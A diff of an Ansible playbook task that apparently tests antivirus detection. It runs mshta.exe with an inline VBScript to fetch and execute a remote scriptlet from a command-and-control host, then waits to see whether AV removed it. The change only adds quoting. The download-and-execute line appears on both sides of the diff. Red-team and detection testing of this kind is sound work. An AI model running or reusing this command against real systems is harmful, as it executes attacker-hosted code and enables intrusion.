@@ -8,7 +8,7 @@
     - name: Run mshta.exe to download and execute script (create a new file evil.sct)
       tags: always
       win_shell: |
-        mshta vbscript:Close(Execute("GetObject(""script:http://{{ cnc_fqdn }}:{{ cnc_port}}/{{ cnc_sct }}"")"))
+        'mshta vbscript:Close(Execute("GetObject(""script:http://{{ cnc_fqdn }}:{{ cnc_port}}/{{ cnc_sct }}"")"))'
     - name: sleep for 10 seconds and continue with play to check if AV removed or Not
       tags: always
       wait_for: timeout=10
